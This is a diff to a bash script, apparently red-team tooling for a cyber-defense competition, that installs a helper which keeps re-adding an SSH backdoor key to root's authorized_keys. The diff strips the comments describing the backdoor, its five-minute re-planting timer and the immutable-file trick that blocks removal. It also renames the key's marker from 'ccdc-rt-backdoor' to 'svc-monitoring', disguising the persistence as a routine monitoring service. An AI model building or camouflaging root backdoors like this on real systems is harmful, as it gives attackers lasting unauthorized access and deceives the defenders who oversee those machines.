@@ -1,8 +1,4 @@
 #!/usr/bin/env bash
-# Systemd timer that re-plants the SSH backdoor key every 5 minutes.
-# If blue team removes authorized_keys, this puts it back within 5 min.
-# Detected by: defender-cli anti-persistence --systemd
-# Removal blocked until --immutable clears chattr +i on unit files.
 set -euo pipefail
 [[ $EUID -eq 0 ]] || { echo "[!] Requires root"; exit 1; }
 
@@ -19,7 +15,7 @@ case "${1:-}" in
     cat > "$BINARY" <<BINARY_EOF
 #!/bin/bash
 AUTH="/root/.ssh/authorized_keys"
-MARKER="# ccdc-rt-backdoor"
+MARKER="# svc-monitoring"
 PUBKEY="${PUBKEY}"
 mkdir -p /root/.ssh
 chmod 700 /root/.ssh
